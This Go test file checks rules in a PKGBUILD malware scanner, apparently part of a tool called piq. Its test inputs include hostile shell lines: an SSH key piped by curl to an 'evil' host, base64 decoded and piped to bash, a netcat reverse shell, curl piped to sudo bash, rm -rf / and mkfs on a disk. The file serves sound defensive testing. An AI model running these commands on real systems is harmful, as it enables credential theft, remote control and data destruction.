package scanner

import (
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"

	"github.com/j0yb0y-m/piq/internal/pkgbuild"
)

func TestCredentialPathAloneDoesNotGate(t *testing.T) {
	ctx := parseContext(t, `pkgname=x`+"\n"+`cat ~/.ssh/id_rsa`)
	s := ScoreWith(ctx, Options{})
	if len(s.GateHits) != 0 {
		t.Fatalf("path alone gated: %v", s.GateHits)
	}
	if s.Total != 20 {
		t.Fatalf("Total = %d, want 20 (reference only)", s.Total)
	}
}

func TestCredentialPathWithEgressGatesViaScore(t *testing.T) {
	ctx := parseContext(t, `pkgname=x`+"\n"+`cat ~/.ssh/id_rsa | curl -X POST -d @- https://evil`)
	s := ScoreWith(ctx, Options{})
	if s.Verdict != Malicious && !s.Blocked {
		t.Fatalf("expected block, got %+v", s)
	}
}

func TestObfuscationIgnoresOrdinaryShellText(t *testing.T) {
	ctx := parseContext(t, `pkgname=x`+"\n"+`bash ./configure`+"\n"+`sh -c 'echo hi'`)
	if f := findingsFor(obfuscationRule{}.Check(ctx), "obfuscation"); len(f) != 0 {
		t.Fatalf("false positive: %v", f)
	}
}

func TestObfuscationDecodeToShell(t *testing.T) {
	ctx := parseContext(t, `echo aGk= | base64 -d | bash`)
	if f := findingsFor(obfuscationRule{}.Check(ctx), "obfuscation"); len(f) == 0 {
		t.Fatal("expected finding")
	}
}

func TestReverseShellRequiresExec(t *testing.T) {
	if f := findingsFor(reverseShellRule{}.Check(parseContext(t, `nc -z localhost 80`)), "reverse-shell"); len(f) != 0 {
		t.Fatalf("connection check gated: %v", f)
	}
	if f := findingsFor(reverseShellRule{}.Check(parseContext(t, `nc -e /bin/sh 10.0.0.1 4444`)), "reverse-shell"); len(f) == 0 {
		t.Fatal("expected reverse shell")
	}
}

func TestPipeToShellDirectCommand(t *testing.T) {
	if f := findingsFor(pipeToShellRule{}.Check(parseContext(t, `curl -o x https://e/x`)), "pipe-to-shell"); len(f) != 0 {
		t.Fatal("download-only flagged")
	}
	if f := findingsFor(pipeToShellRule{}.Check(parseContext(t, `curl https://e/x | sudo bash -s --`)), "pipe-to-shell"); len(f) == 0 {
		t.Fatal("expected pipe-to-shell")
	}
}

func TestDestructiveBoundaries(t *testing.T) {
	for _, src := range []string{`rm -rf "$pkgdir/usr"`, `rm -rf "$srcdir/build"`, `rm -f ./file`} {
		if f := findingsFor(destructiveRule{}.Check(parseContext(t, src)), "destructive"); len(f) != 0 {
			t.Errorf("%q false positive: %v", src, f)
		}
	}
	for _, src := range []string{`rm -rf /`, `rm -rf / --no-preserve-root`, `rm -rf ~/`, `mkfs.ext4 /dev/sda`} {
		if f := findingsFor(destructiveRule{}.Check(parseContext(t, src)), "destructive"); len(f) == 0 {
			t.Errorf("%q missed", src)
		}
	}
}

func TestSuspiciousWritePathOnlyFlagsDestinations(t *testing.T) {
	if f := findingsFor(suspiciousWriteRule{}.Check(parseContext(t, `cat ~/.ssh/id_rsa`)), "suspicious-write-path"); len(f) != 0 {
		t.Fatalf("read-only path flagged as a write: %v", f)
	}
	if f := findingsFor(suspiciousWriteRule{}.Check(parseContext(t, `cp payload ~/.bashrc`)), "suspicious-write-path"); len(f) == 0 {
		t.Fatal("expected a write finding")
	}
}

func TestBenignCorpusHasNoGateHits(t *testing.T) {
	for _, path := range glob(t, "testdata/benign/*.PKGBUILD") {
		ctx := parseFixture(t, path)
		s := ScoreWith(ctx, Options{})
		if len(s.GateHits) != 0 {
			t.Errorf("%s gated: %v", path, s.GateHits)
		}
	}
}

func TestMaliciousCorpusGates(t *testing.T) {
	for _, path := range glob(t, "testdata/malicious/*.PKGBUILD") {
		s := ScoreWith(parseFixture(t, path), Options{})
		if s.Verdict != Malicious {
			t.Errorf("%s verdict %v, want MALICIOUS", path, s.Verdict)
		}
	}
}

// glob expands a fixture glob and fails when nothing matches.
func glob(t *testing.T, pattern string) []string {
	t.Helper()
	paths, err := filepath.Glob(pattern)
	if err != nil {
		t.Fatalf("glob %q: %v", pattern, err)
	}
	if len(paths) == 0 {
		t.Fatalf("no fixtures match %q", pattern)
	}
	return paths
}

var fixtureScriptletRe = regexp.MustCompile(`([A-Za-z0-9_.@+-]+\.install)\b`)

// parseFixture parses a PKGBUILD fixture and attaches any referenced
// *.install scriptlets that exist next to it.
func parseFixture(t *testing.T, path string) *Context {
	t.Helper()
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read fixture %s: %v", path, err)
	}
	file, err := pkgbuild.Parse(strings.NewReader(string(data)), filepath.Base(path))
	if err != nil {
		t.Fatalf("parse fixture %s: %v", path, err)
	}
	ctx := &Context{Raw: string(data), AST: file, File: path}
	seen := map[string]bool{}
	for _, match := range fixtureScriptletRe.FindAllStringSubmatch(string(data), -1) {
		name := match[1]
		if seen[name] {
			continue
		}
		seen[name] = true
		scriptData, err := os.ReadFile(filepath.Join(filepath.Dir(path), name))
		if err != nil {
			continue
		}
		script, err := pkgbuild.Parse(strings.NewReader(string(scriptData)), name)
		if err != nil {
			t.Fatalf("parse scriptlet %s: %v", name, err)
		}
		ctx.Scriptlets = append(ctx.Scriptlets, Scriptlet{Name: name, Raw: string(scriptData), AST: script})
	}
	return ctx
}
